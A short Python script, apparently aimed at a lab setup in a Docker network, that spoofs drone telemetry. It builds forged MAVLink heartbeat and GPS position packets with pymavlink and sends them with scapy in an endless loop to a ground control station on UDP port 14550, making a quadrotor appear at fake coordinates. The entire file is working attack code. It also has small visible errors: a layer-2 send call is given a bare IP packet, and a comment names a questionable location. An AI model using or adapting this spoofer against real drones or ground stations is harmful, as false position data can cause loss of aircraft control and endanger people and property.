from pymavlink import mavutil
from scapy.all import *
import time, sys

TARGET_IP = "10.13.0.6"   # GCS bridge inside Docker network
TARGET_PORT = 14550

# Spoofed coords — middle of nowhere (Russia)
FAKE_LAT = 473566100   # 47.35 N
FAKE_LON = 854619300   # 85.46 E

def make_mav():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav

def heartbeat():
    mav = make_mav()
    return mav.heartbeat_encode(
        type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
        autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
        base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        custom_mode=3,
        system_status=mavutil.mavlink.MAV_STATE_ACTIVE
    ).pack(mav)

def gps_raw():
    mav = make_mav()
    return mav.gps_raw_int_encode(
        time_usec=int(time.time() * 1e6),
        fix_type=3, lat=FAKE_LAT, lon=FAKE_LON,
        alt=1500, eph=100, epv=100, vel=500,
        cog=0, satellites_visible=10
    ).pack(mav)

def global_pos():
    mav = make_mav()
    return mav.global_position_int_encode(
        time_boot_ms=int(time.time()*1e3) % 4294967295,
        lat=FAKE_LAT, lon=FAKE_LON,
        alt=1500000, relative_alt=1500000,
        vx=0, vy=0, vz=0, hdg=0
    ).pack(mav)

def send(data):
    pkt = IP(dst=TARGET_IP)/UDP(dport=TARGET_PORT)/Raw(load=data)
    sendp(pkt, iface="eth0", verbose=False)

print(f"[!] GPS SPOOFING — sending fake coords to {TARGET_IP}:{TARGET_PORT}")
print(f"[!] Fake location: {FAKE_LAT/1e7:.4f}N, {FAKE_LON/1e7:.4f}E")
print("[!] Ctrl+C to stop\n")

count = 0
while True:
    send(heartbeat())
    send(gps_raw())
    send(global_pos())
    count += 1
    print(f"\r[+] Sent {count} spoofed packets", end="", flush=True)
    time.sleep(0.5)